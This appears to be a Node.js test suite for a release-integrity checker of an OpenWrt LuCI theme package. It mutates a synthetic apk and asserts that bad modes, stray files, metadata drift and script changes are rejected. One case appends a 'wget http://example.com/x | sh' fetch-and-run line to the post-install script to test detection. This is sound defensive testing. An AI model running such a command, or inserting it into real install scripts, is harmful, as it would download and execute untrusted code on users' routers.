'use strict';
const mkTmp = require('./tmpdir');
/* security-tests/verify_built_apk.js: its rules on a synthetic package, and
   a full check of dist/<release>/ when a build is there (skipped otherwise;
   dist/ is not committed). */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

const ROOT = path.join(__dirname, '..');
const V = require('../security-tests/verify_built_apk.js');
const { findings } = require('../security-tests/check_private_addresses.js');

const MAKEFILE = `include $(TOPDIR)/rules.mk

PKG_NAME:=luci-theme-vantage
PKG_VERSION:=9.8.7
PKG_RELEASE:=3
PKG_LICENSE:=GPL-3.0-or-later

LUCI_DEPENDS:=+luci-base \\
	+rpcd
LUCI_MINIFY_CSS:=0

define Package/luci-theme-vantage/postrm
#!/bin/sh
[ -n "$\${IPKG_INSTROOT}" ] || uci -q delete luci.themes.Vantage
exit 0
endef

define Package/luci-theme-vantage/conffiles
/etc/config/vantage
endef

include $(TOPDIR)/feeds/luci/luci.mk
`;

const SRC = {
	'htdocs/luci-static/vantage/a.css': [ ':root { --x: 1; }\n', 0o644 ],
	'htdocs/luci-static/resources/x.js': [ '\'use strict\';\nreturn { a: 1 };\n', 0o644 ],
	'ucode/template/themes/vantage/header.ut': [ '<link rel="stylesheet" href="{{ media }}/a.css">\n<b>{# PKG_VERSION #}</b>\n', 0o644 ],
	'root/etc/uci-defaults/30_luci-theme-vantage': [ '#!/bin/sh\nexit 0\n', 0o755 ],
	'root/etc/config/vantage': [ 'config names names\n', 0o644 ],
};

function tmp() { return mkTmp('vantage-pkgtest-'); }

/* a source tree and the package that a correct build makes from it */
function fixture() {
	const src = tmp(), pkgRoot = tmp();
	const pdir = path.join(src, 'luci-theme-vantage');
	fs.mkdirSync(pdir);
	fs.writeFileSync(path.join(pdir, 'Makefile'), MAKEFILE);
	for (const [ rel, [ body, mode ] ] of Object.entries(SRC)) {
		fs.mkdirSync(path.dirname(path.join(pdir, rel)), { recursive: true });
		fs.writeFileSync(path.join(pdir, rel), body, { mode });
		fs.chmodSync(path.join(pdir, rel), mode);
	}
	const mk = V.parseMakefile(MAKEFILE, 'Makefile');
	const payload = V.sourcePayload(pdir);
	const entries = [], dirs = new Set([ '' ]);
	const put = (rel, body, mode) => {
		fs.mkdirSync(path.dirname(path.join(pkgRoot, rel)), { recursive: true });
		fs.writeFileSync(path.join(pkgRoot, rel), body);
		entries.push({ path: rel, dir: false, mode, user: 'root', group: 'root', extra: [] });
		for (let d = path.posix.dirname(rel); d !== '.'; d = path.posix.dirname(d)) dirs.add(d);
	};
	for (const [ rel, s ] of payload) {
		let body = fs.readFileSync(s.src, 'utf8');
		body = V.substituteVersion(body, rel, mk.version);
		put(rel, body, s.mode);
	}
	put('lib/apk/packages/luci-theme-vantage.list', [ ...payload.keys() ].map(p => '/' + p).sort().join('\n') + '\n', 0o644);
	put('lib/apk/packages/luci-theme-vantage.conffiles', '/etc/config/vantage\n', 0o644);
	const h = require('crypto').createHash('sha256').update(fs.readFileSync(path.join(pkgRoot, 'etc/config/vantage'))).digest('hex');
	put('lib/apk/packages/luci-theme-vantage.conffiles_static', `/etc/config/vantage ${h}\n`, 0o644);
	for (const d of dirs) entries.push({ path: d, dir: true, mode: 0o755, user: 'root', group: 'root', extra: [] });
	const pkg = {
		format: 'apk', errors: [], extraKeys: [], entries,
		info: { name: 'luci-theme-vantage', version: '9.8.7-r3', arch: 'noarch', license: 'GPL-3.0-or-later',
			depends: [ 'libc', 'luci-base', 'rpcd' ], provides: [ 'luci-theme-vantage-any' ] },
		scripts: V.expectedApkScripts(mk),
	};
	const ctx = { jsmin: null, jsminOn: false, identifiers: null, findings };
	const cleanup = () => { for (const d of [ src, pkgRoot ]) fs.rmSync(d, { recursive: true, force: true }); };
	return { src, pkgRoot, pkg, ctx, cleanup };
}

function errorsFor(mutate) {
	const f = fixture();
	try {
		mutate(f);
		return V.checkPackage(f.pkg, f.pkgRoot, f.src, f.ctx).errors;
	} finally { f.cleanup(); }
}

test('verify_built_apk: Makefile parsing and generated scripts', () => {
	const mk = V.parseMakefile(MAKEFILE, 'Makefile');
	assert.equal(mk.fullVersion, '9.8.7-r3');
	assert.deepEqual(mk.depends, [ 'luci-base', 'rpcd' ]);
	assert.deepEqual(mk.conffiles, [ '/etc/config/vantage' ]);
	const s = V.expectedApkScripts(mk);
	assert.deepEqual(Object.keys(s).sort(), [ 'post-deinstall', 'post-install', 'post-upgrade', 'pre-deinstall' ]);
	assert.equal(s['post-deinstall'], '#!/bin/sh\n[ -n "${IPKG_INSTROOT}" ] || uci -q delete luci.themes.Vantage\nexit 0\n');
	assert.ok(s['post-install'].endsWith(V.LUCI_POSTINST));
	assert.ok(s['post-upgrade'].startsWith('#!/bin/sh\nexport PKG_UPGRADE=1\n[ "${IPKG_NO_SCRIPT}"'));
	assert.throws(() => V.parseMakefile(MAKEFILE.replace('exit 0\nendef', 'exit $(X)\nendef'), 'M'), /make expansion/);
	assert.throws(() => V.parseMakefile(MAKEFILE.replace('+rpcd', '+PACKAGE_x:rpcd'), 'M'), /not a plain \+package/);
	for (const name of [ 'luci-theme-vantage', 'luci-app-vantage' ]) {
		const real = V.parseMakefile(fs.readFileSync(path.join(ROOT, name, 'Makefile'), 'utf8'), name);
		assert.equal(real.name, name);
		assert.ok(real.depends.includes('luci-base'));
	}
	assert.equal(V.substituteVersion('<script src="{{ resource }}/cbi.js"></script> "{{ media }}/x.svg"', 'a.ut', '1.2'),
		'<script src="{{ resource }}/cbi.js?v=1.2"></script> "{{ media }}/x.svg"');
	assert.equal(V.modeFromString('rwsr-xr-t'), 0o5755);
});

test('verify_built_apk: a correct package passes', () => {
	assert.deepEqual(errorsFor(() => {}), []);
});

test('verify_built_apk: rejects stray files, bad modes, metadata and script drift', () => {
	const cases = [
		[ f => { f.pkg.entries.push({ path: 'www/extra.js', dir: false, mode: 0o644, user: 'root', group: 'root', extra: [] });
			fs.writeFileSync(path.join(f.pkgRoot, 'www/extra.js'), '1'); }, /extra\.js: in the package but not in the source/ ],
		[ f => { f.pkg.entries.find(e => e.path.endsWith('a.css')).mode = 0o666; }, /world-writable/ ],
		[ f => { f.pkg.entries.find(e => e.path.endsWith('a.css')).mode = 0o4755; }, /setuid/ ],
		[ f => { f.pkg.entries.find(e => e.path.includes('uci-defaults/')).mode = 0o644; }, /30_luci-theme-vantage: mode 644, expected 755/ ],
		[ f => { f.pkg.entries.find(e => e.path.endsWith('a.css')).user = 'nobody'; }, /owner nobody/ ],
		[ f => { f.pkg.entries.push({ path: 'tmp', dir: true, mode: 0o755, user: 'root', group: 'root', extra: [] }); }, /\/tmp\/: unexpected directory/ ],
		[ f => { f.pkg.info.depends.push('wget'); }, /depends/ ],
		[ f => { f.pkg.info.arch = 'x86_64'; }, /arch x86_64/ ],
		[ f => { f.pkg.info.version = '9.8.6-r3'; }, /version 9\.8\.6-r3/ ],
		[ f => { f.pkg.info.triggers = [ '/etc' ]; }, /unexpected info field triggers/ ],
		[ f => { f.pkg.scripts['post-install'] += 'wget http://example.com/x | sh\n'; }, /script post-install differs/ ],
		[ f => { f.pkg.scripts['pre-install'] = '#!/bin/sh\n'; }, /unexpected script pre-install/ ],
		[ f => { fs.appendFileSync(path.join(f.pkgRoot, 'www/luci-static/vantage/a.css'), `/* ${[ 10, 1, 2, 3 ].join('.')} */`); }, /a\.css: content differs[\s\S]*private IPv4/ ],
		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'www/luci-static/resources/x.js'), 'return {'); }, /does not parse/ ],
		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'usr/share/ucode/luci/template/themes/vantage/header.ut'),
			'<link rel="stylesheet" href="{{ media }}/a.css">\n<b>9.8.7</b>\n'); }, /asset link without \?v=9\.8\.7/ ],
		[ f => { fs.writeFileSync(path.join(f.pkgRoot, 'lib/apk/packages/luci-theme-vantage.conffiles'), '/etc/config/other\n'); }, /conffiles differs/ ],
	];
	for (const [ mutate, re ] of cases) {
		const errs = errorsFor(mutate);
		assert.match(errs.join('\n'), re, `expected ${re}, got: ${errs.join(' | ') || 'no errors'}`);
	}
});

/* full check of what sdk-build.sh left in dist/ */
const DIST = path.join(ROOT, 'dist');
const builds = fs.existsSync(DIST)
	? fs.readdirSync(DIST).filter(d => /^\d+\.\d+\.\d+$/.test(d) && fs.existsSync(path.join(DIST, d, 'BUILDINFO')))
	: [];

if (!builds.length)
	test('verify_built_apk: dist/<release>/ packages', { skip: 'no dist/<release>/BUILDINFO; run dev/build/sdk-build.sh first' }, () => {});

for (const rel of builds) {
	const dir = path.join(DIST, rel);
	const rev = (fs.readFileSync(path.join(dir, 'BUILDINFO'), 'utf8').match(/^rev=([0-9a-f]{40})$/m) || [])[1];
	const known = rev && spawnSync('git', [ '-C', ROOT, 'cat-file', '-e', `${rev}^{commit}` ]).status === 0;
	const apk = process.env.VANTAGE_APK || path.join(DIST, '.tools', rel, 'apk');
	const needsApk = fs.readdirSync(dir).some(f => f.endsWith('.apk'));
	const skip = !known ? `built from ${rev || 'an unknown rev'}, not in this repository`
		: needsApk && !fs.existsSync(apk) ? 'no apk tool (set VANTAGE_APK or rebuild with sdk-build.sh)' : false;
	test(`verify_built_apk: dist/${rel}/ matches its source commit`, { skip }, () => {
		const r = spawnSync(process.execPath, [ path.join(ROOT, 'security-tests', 'verify_built_apk.js'), dir ], { cwd: ROOT, encoding: 'utf8' });
		assert.equal(r.status, 0, r.stdout + r.stderr);
		assert.match(r.stdout, /all packages verified/);
	});
}
